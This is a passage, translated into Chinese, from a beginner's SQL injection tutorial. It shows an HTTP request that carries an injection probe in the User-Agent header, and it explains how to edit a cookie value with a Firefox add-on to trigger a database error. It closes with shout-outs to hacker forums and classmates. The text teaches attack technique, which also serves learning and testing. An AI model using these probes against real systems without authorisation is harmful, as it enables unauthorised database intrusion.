这允许服务器生成文档的反向链接列表，用于兴趣，记录等。它允许跟踪故障链接以进行维护。

    
    
    GET /index.php HTTP/1.1
    Host: [host]
    User-Agent: aaa' or 1/*
    Referer: http://www.yaboukir.com

## ＃0x10.d~Cookie

Cookie Manager +（Firefox
Addon）允许查看，编辑和创建新的Cookie。它还允许显示有关cookie的额外信息，并允许一次编辑多个cookie，以及备份/恢复它们。

安装后，从“工具”菜单中选择“Cookies管理器+”。我们选择与目标应用程序相关的Cookie变量。

我们将编辑language_id变量。为了弄清楚SQL注入缺陷，我们将在字段中添加引号“'”  
变量language_id的内容。

刷新页面或单击应用程序的其他内部链接后，应用程序将使用编辑的HTTP cookie提交请求。结果是触发了SQL错误：

此数据库错误警告我们易受SQL注入漏洞。

使用Cookies Manager +的优点是它易于使用，直接对cookie执行操作并保存以前编辑的cookie值。

我们将尝试使用另一个Firefox插件确定列数。

Greetz＆Shoutz

在darkmindz向所有人致以Greetz。在GNY和现在r00tw0rm未定义的情况下，对于Psycho和sToRm（两个家伙）的负荷。也欢迎t0mmy9（感谢总是帮助我学习东西），这是合法的。

嗨，我所有的同学bigyan musa，bhakunde sameer，gainda sandeep，joe haatti，dipesh
bhedo，eman bhainsi，milan biralo，nikesh gandeula（Pheretima
posthuma）和我所有的其他同学。你们这些人，我在生物课上度过了无聊的日子。希望能见到你们所有人。我希望你们有光明的未来。成为成功的医生，工程师或任何你想成为的人......

结束

有了这个，我的教程主要是针对新手，在这里结束。我希望你喜欢我的教程。在我自学了所有这些东西后，我希望能在新手概念中编写新的教程。

最后，阅读越来越多，越来越多地问，这是学习东西的最佳方式。

继续学习和享受它。

Free to Freedom... Hack The Planet !

作者： Insider

翻译：i春秋翻译小组-Neo(李皓伟）

翻译来源：<https://greysec.net/showthread.php?tid=496>

##  

